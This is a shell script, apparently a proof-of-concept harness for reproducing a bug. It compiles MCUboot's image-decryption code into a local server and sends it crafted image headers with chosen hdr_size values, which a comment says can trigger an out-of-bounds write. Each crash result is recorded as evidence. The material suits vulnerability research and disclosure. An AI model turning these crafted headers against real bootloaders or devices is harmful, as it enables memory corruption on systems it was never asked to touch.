#!/bin/sh
# W2: live 127.0.0.1 process -> wire-supplied image header -> real pinned
# decrypt_region_inplace() + real AES-CTR. No serial/SMP parser, no rung 5.
set -eu
cd "$(dirname "$0")"
UP=../upstream-parent
mkdir -p evidence
DEFS="-D__BOOTSIM__ -DMCUBOOT_HAVE_ASSERT_H -DMCUBOOT_USE_FLASH_AREA_GET_SECTORS -DMCUBOOT_MAX_IMG_SECTORS=128 -DMCUBOOT_BOOT_MAX_ALIGN=8 -DMCUBOOT_IMAGE_NUMBER=1 -DMCUBOOT_ENC_IMAGES -DMCUBOOT_ENCRYPT_KW -DMCUBOOT_USE_TINYCRYPT -DMCUBOOT_ENC_BUILTIN_KEY -DMCUBOOT_FIH_PROFILE_OFF"
INCS="-I $UP/sim/mcuboot-sys/csupport -I $UP/boot/bootutil/include -I $UP/boot/bootutil/src -I $UP/ext/tinycrypt/lib/include"
# shellcheck disable=SC2086
gcc -O1 -g -fno-stack-protector $DEFS $INCS -o wire-server wire-harness.c \
    encrypted-real.o \
    "$UP/ext/tinycrypt/lib/source/aes_encrypt.c" \
    "$UP/ext/tinycrypt/lib/source/aes_decrypt.c" \
    "$UP/ext/tinycrypt/lib/source/utils.c" \
    "$UP/ext/tinycrypt/lib/source/ctr_mode.c" 2>evidence/wire-build.err || {
        cat evidence/wire-build.err; exit 1;
    }

for hdr in 4104 6144 7168 2048; do
    LOG="evidence/wire-$hdr.log"
    rm -f "$LOG"
    ./wire-server >"$LOG" 2>&1 &
    SERVER=$!
    for _ in 1 2 3 4 5 6 7 8 9 10; do
        if grep -q '^PORT=' "$LOG"; then break; fi
        sleep 0.1
    done
    PORT=$(awk -F= '/^PORT=/{print $2; exit}' "$LOG")
    if [ -z "$PORT" ]; then cat "$LOG"; exit 1; fi
    python3 -c '
import socket, struct, sys
port, hdr = int(sys.argv[1]), int(sys.argv[2])
head = struct.pack("<IIHHII", 0x96f3b83d, 0, hdr, 0,
                   0xffffffff - hdr if hdr > 4096 else 4096, 4)
head += b"\x00" * 12
assert len(head) == 32
s = socket.create_connection(("127.0.0.1", port), timeout=5)
s.sendall(head)
s.close()
' "$PORT" "$hdr"
    # A crafted header may kill the process in the real OOB write; record it.
    wait "$SERVER" && RC=0 || RC=$?
    kill "$SERVER" 2>/dev/null || true
    echo "hdr_size=$hdr SERVER_RC=$RC" | tee -a "$LOG"
    cat "$LOG"
done
echo "WIRE_DONE" | tee evidence/wire-run.log
